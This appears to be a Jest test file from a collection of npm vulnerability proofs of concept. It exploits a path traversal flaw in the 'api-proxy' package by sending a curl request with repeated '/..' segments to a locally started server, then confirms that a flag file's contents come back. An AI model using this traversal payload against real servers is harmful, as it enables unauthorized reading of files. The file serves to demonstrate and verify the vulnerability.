//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/api-proxy/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in api-proxy", (done) => {
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  require("api-proxy").start(8888); //starting the server.

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
